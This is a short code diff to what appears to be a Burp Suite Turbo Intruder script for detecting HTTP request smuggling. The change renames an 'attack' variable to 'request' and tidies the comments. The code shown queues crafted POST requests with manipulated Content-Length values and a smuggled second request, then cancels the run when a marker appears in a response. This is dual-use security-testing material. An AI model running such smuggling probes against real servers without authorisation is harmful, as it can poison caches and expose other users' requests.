@@ -9,7 +9,7 @@ def queueRequests(target, wordlists):
                            maxRetriesPerRequest=0
                            )
 
-    attack = '''POST /?ABCDEF HTTP/1.1
+    request = '''POST /?ABCDEF HTTP/1.1
 Host: portswigger.net
 Content-Length: 123
 Content-Type: application/x-www-form-urlencoded
@@ -38,13 +38,13 @@ Connection: keep-alive
         for CL in range(start, end):
             label = 'CL: '+str(CL)+' Offset: '+ str(CL - len(chopped))
             for x in range(35):
-                engine.queue(attack + "G"*CL, label=label)
+                engine.queue(request + "G"*CL, label=label)
                 engine.queue(chopped+smuggled, label=label)
 
 def handleResponse(req, interesting):
     table.add(req)
 
-    # check for smuggled response and stop the attack
-    # when the attack is stopped, look at the label on the succesful response to see the offset
+    # check for smuggled response and stop the run
+    # when the run is stopped, look at the label on the successful response to see the offset
     if 'WRTZ' in req.response: # or req.status  == 405:
         req.engine.cancel()
